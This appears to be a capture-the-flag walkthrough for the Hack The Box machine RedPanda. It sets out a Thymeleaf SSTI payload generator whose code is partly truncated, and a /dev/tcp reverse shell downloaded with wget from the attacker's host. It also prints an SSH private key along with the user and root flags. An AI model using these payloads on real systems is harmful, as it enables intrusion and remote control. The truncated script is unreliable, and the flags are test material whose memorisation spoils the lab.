![RedPanda.PNG](/assets/Machines/Easy/RedPanda/RedPanda.png)

1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.170
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.170
```

**Output**
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

3. Visit the page
   
![Page.PNG](/assets/Machines/Easy/RedPanda/Page.PNG)


4. In this machine we can exploit ssti (https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)


5. With the next script on Python we can get information about the machine.

```python
def injection(comm):
    cmd = comm
    build = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime>
    first_ascii = str(ord(comm[0]))
    build += ".exec(T(java.lang.Character).toString(" + first_ascii + ")"
    comm = comm[1:]

    for letter in comm:
        letter_ascii = str(ord(letter))
        build += ".concat(T(java.lang.Character).toString(" + letter_ascii +>

    build += ").getInputStream())}"
    return build


if __name__ == "__main__":
    user_input = input("To convert: ")
    print(injection(user_input))
```

6. Put the command you can run and search in the **RedPanda**
   
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| python3 convert_to_java.py 
To convert: cat /etc/passwd
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

Next, search and look

![Example.PNG](/assets/Machines/Easy/RedPanda/Example.PNG)

7. Now, download on the machine a revese shell to next execute and obtaine a reverse shell.

7.1 Create reverse shell on https://www.revshells.com/ and put into a file
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| cat reverse.sh 
#!/bin/bash
sh -i >& /dev/tcp/10.10.15.6/4949 0>&1
```
---
7.2 Use python to create a server and use wget to download *reverse.sh** on machine
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| python3 convert_to_java.py 
To convert: wget http://10.10.15.6:4545/reverse.sh
```
> Put the output on **RedPanda search** 
---
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| python3 convert_to_java.py 
To convert: chmod u+x reverse.sh
```
> Put the output on **RedPanda search** 
---
Listen in port of you create a reverse shell
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| nc -lvnp 4949
```

---
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| python3 convert_to_java.py 
To convert: chmod u+x reverse.sh
```
> Put the output on **RedPanda search** 
---
Now, you obtain reverse shell and spawn a shell with python and pty
```bash
┌──(root㉿est)-[/home/kali]
└─| nc -lvnp 4949
listening on [any] 4949 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.11.170] 52696
sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ which gcc
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

8. Cat the **user flag**

```bash
woodenk@redpanda:/$ cd home/woodenk/
woodenk@redpanda:~$ cat user.txt 
edcd98fa4b7c41d172093fa042edd753 
```

9. In the next path, cat the file **MainController.java** and search the password

```bash
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java 
```


![Password](/assets/Machines/Easy/RedPanda/Password.PNG)

10. Connect to ssh with credentials `woodenk` and `RedPandazRule`
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| ssh woodenk@10.10.11.170
woodenk@10.10.11.170's password: 
woodenk@redpanda:~$ 
```

11. In the path `/tmp` cat the file gg_creds.xml

```bash
woodenk@redpanda:/tmp$ cat gg_creds.xml
```

**Output**
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>gg</author>
  <image>
    <uri>/img/../../../../../../../tmp/image_exp.jpg</uri>
    <views>2</views>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
  </image>
  <totalviews>5</totalviews>
</credits>
```


12. Put the openssh key on a file to connect with ssh how root and put 600 permission
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| cat key                
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
                                                                             
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| chmod 600 key 
```

13. Connect to ssh
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Easy/RedPanda]
└─| ssh root@10.10.11.170 -i key
```

**Output**
```bash
root@redpanda:~|
```

14. Cat the **root flag**
```bash
root@redpanda:~| cat root.txt 
f468974d78897cb2dcb169d91e5e2f79
```